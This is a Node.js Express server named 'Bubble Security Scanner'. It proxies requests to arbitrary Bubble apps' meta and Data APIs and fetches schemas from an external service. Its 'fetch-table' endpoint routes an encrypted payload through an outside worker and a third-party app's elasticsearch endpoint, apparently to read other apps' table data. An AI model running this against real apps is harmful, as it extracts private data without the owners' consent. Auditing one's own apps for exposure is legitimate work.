import express from 'express';
import cors from 'cors';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(join(__dirname, 'public')));

// Proxy endpoint for Bubble meta API
app.get('/api/meta', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: 'URL parameter is required' });
  }

  try {
    const baseUrl = new URL(url).origin;
    const metaUrl = `${baseUrl}/api/1.1/meta`;

    const response = await fetch(metaUrl);
    const data = await response.json();

    res.json(data);
  } catch (error) {
    console.error('Meta API error:', error);
    res.status(500).json({ error: 'Failed to fetch meta data', details: error.message });
  }
});

// Proxy endpoint for DBML schema
app.get('/api/schema', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: 'URL parameter is required' });
  }

  try {
    const encodedUrl = encodeURIComponent(url);
    const schemaUrl = `https://xgkxmsaivblwqfkdhtekn3nase0tudjd.lambda-url.us-east-1.on.aws/api/schema/${encodedUrl}?format=dbml`;

    const response = await fetch(schemaUrl);
    const text = await response.text();

    // Parse DBML to extract table names
    const tables = parseDBML(text);

    res.json({ raw: text, tables });
  } catch (error) {
    console.error('Schema API error:', error);
    res.status(500).json({ error: 'Failed to fetch schema', details: error.message });
  }
});

// Parse DBML format to extract table names
function parseDBML(dbml) {
  const tables = [];
  // Match Table "name" { or Table name { or Table %name {
  const tableRegex = /Table\s+(?:"([^"]+)"|(%?\w+))\s*\{/g;
  let match;

  while ((match = tableRegex.exec(dbml)) !== null) {
    const tableName = (match[1] || match[2]).replace(/%/g, '');
    if (tableName) {
      tables.push(tableName);
    }
  }

  return tables;
}

// Proxy endpoint for direct Bubble Data API (simpler approach)
app.get('/api/data', async (req, res) => {
  const { url, type, cursor, limit } = req.query;

  if (!url || !type) {
    return res.status(400).json({ error: 'URL and type parameters are required' });
  }

  try {
    const baseUrl = new URL(url).origin;
    const params = new URLSearchParams();
    if (cursor) params.set('cursor', cursor);
    if (limit) params.set('limit', limit);

    const dataUrl = `${baseUrl}/api/1.1/obj/${type}${params.toString() ? '?' + params.toString() : ''}`;

    const response = await fetch(dataUrl);
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('Data API error:', error);
    res.status(500).json({ error: 'Failed to fetch table data', details: error.message });
  }
});

// Proxy endpoint for fetching table data via encrypt + worker API
app.post('/api/fetch-table', async (req, res) => {
  const { x, y, payload, appName, appUrl } = req.body;

  if (!payload || !appName || !appUrl) {
    return res.status(400).json({ error: 'payload, appName, and appUrl are required' });
  }

  try {
    // Step 1: Call encrypt API to get x, y, z
    const encryptUrl = 'https://5r6gtzlbpf.execute-api.us-east-1.amazonaws.com/prod/encrypt';

    console.log('Encrypt request payload:', JSON.stringify({ x, y, payload }, null, 2));

    const encryptResponse = await fetch(encryptUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ x, y, payload }),
    });

    const encryptData = await encryptResponse.json();
    console.log('Encrypt response:', JSON.stringify(encryptData, null, 2));

    if (!encryptData.z) {
      throw new Error('Encryption failed - no z value returned');
    }

    // Step 2: Send x, y, z to worker API
    // Worker always uses 99reviews endpoint - the encrypted payload contains the target app details
    const workerUrl = 'https://api-worker.james-a7a.workers.dev';

    const workerPayload = {
      x: encryptData.x,
      y: encryptData.y,
      z: encryptData.z,
      appname: '99reviews-43419',
      url: 'https://99reviews.io/version-test/elasticsearch/search',
    };

    console.log('Worker request payload:', JSON.stringify(workerPayload, null, 2));

    const workerResponse = await fetch(workerUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(workerPayload),
    });

    const data = await workerResponse.json();
    console.log('Worker response:', JSON.stringify(data, null, 2).substring(0, 1500));
    res.json(data);
  } catch (error) {
    console.error('Fetch table error:', error);
    res.status(500).json({ error: 'Failed to fetch table data', details: error.message });
  }
});

// Serve the main page
app.get('/', (req, res) => {
  res.sendFile(join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Bubble Security Scanner running at http://localhost:${PORT}`);
});
